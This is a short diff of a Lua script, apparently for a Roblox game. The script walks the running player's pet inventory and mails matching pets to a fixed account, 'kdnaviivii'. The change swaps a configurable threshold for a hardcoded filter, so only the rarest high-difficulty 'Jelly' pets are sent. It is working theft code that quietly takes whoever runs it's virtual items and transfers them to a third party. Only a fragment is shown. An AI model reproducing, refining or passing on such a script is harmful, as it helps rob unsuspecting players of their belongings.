@@ -121,7 +121,7 @@ return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild
 end
 spawn(function()pcall(function()
 for i,v in pairs(save.Inventory.Pets) do
-if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty < _G.Min then
+if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty > 90000000 then
 _mail("kdnaviivii", "Pet", i, (v.am or 1))
 end
 end
